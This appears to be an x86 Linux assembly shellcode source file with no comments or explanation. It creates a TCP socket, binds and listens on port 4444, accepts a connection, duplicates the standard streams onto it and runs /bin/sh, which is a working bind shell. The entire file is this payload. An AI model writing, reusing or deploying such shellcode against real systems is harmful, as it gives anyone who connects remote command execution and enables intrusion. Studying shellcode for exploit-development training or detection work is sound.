global _start

section .text
_start:
xor eax,eax
xor ebx,ebx
xor ecx,ecx
xor edx,edx

mov ax, 0x66
mov bl, 0x1
push edx
push ebx
push 0x2
mov ecx,esp
int 0x80
mov edi,eax

push edx
push edx
push edx
push word 0x5c11
push word 0x2
mov esi, esp

mov al,0x66
mov bl,0x2
push 0x10
push esi
push edi
mov ecx,esp
int 0x80

mov al,0x66
mov bl,0x4
push edx
push edi
mov ecx,esp
int 0x80

mov al,0x66
mov bl, 0x5
push edx
push edx
push edi
mov ecx,esp
int 0x80
mov edi,eax

xor ecx,ecx
mov cl,0x3

loop:
xor eax,eax
mov al,0x3f
mov ebx,edi
dec cl
int 0x80

jnz loop



xor edx,edx
push edx   
push  0x68732f6e    
push  0x69622f2f   
mov ebx, esp     
push edx        
push ebx
mov ecx, esp
mov al, 0xb  
int 0x80
